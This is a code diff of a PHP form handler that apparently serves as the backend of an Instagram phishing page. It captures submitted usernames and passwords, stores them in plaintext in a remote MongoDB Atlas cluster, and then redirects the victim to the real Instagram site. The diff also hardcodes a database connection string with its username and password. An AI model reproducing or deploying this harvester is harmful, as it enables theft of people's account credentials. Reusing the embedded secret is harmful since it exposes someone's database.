@@ -1,27 +1,56 @@
 <?php
 session_start();
-require "config.php";
 
+// -----------------------
+// ✅ 1. MongoDB CONFIG
+// -----------------------
+require 'vendor/autoload.php'; // MongoDB PHP library
+
+$mongoURI = "mongodb+srv://imanetidjani:yghcbv@cluster0.apc6t.mongodb.net/security?retryWrites=true&w=majority&appName=Cluster0"; 
+// Example:
+// mongodb+srv://imanetidjani:Password123@cluster0.apc6t.mongodb.net/security?retryWrites=true&w=majority&appName=Cluster0
+
+try {
+    $client = new MongoDB\Client($mongoURI);
+    $db = $client->security;       // database
+    $collection = $db->users;      // collection (like table)
+
+} catch (Exception $e) {
+    die("MongoDB connection failed: " . $e->getMessage());
+}
+
+
+// -----------------------
+// ✅ 2. Handle form POST
+// -----------------------
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Get form data
-    $email = isset($_POST['email']) ? trim($_POST['email']) : "";
+
+    $email = isset($_POST['username']) ? trim($_POST['username']) : "";
     $password = isset($_POST['password']) ? trim($_POST['password']) : "";
 
-    // Insert into database
-    $stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (:email, :password)");
-    $stmt->execute([
-        ':email' => $email,
-        ':password' => $password,
-    ]);
+    if (empty($email) || empty($password)) {
+        die("Please fill in all fields.");
+    }
 
-    // Optional session
-    $_SESSION['email'] = $email;
+    try {
+        // ✅ Insert user into MongoDB
+        $collection->insertOne([
+            "email" => $email,
+            "password" => $password,
+            "created_at" => date("Y-m-d H:i:s")
+        ]);
 
-    // Redirect to any page
-    header("Location: https://www.instagram.com/"); // change to your page
-    exit;
+        // ✅ Session
+        $_SESSION['email'] = $email;
+
+        // ✅ Redirect
+        header("Location: https://instagram.com");
+        exit;
+
+    } catch (Exception $e) {
+        die("Database error: " . $e->getMessage());
+    }
 } else {
-    // If accessed directly, redirect to form
     header("Location: index.php");
     exit;
 }
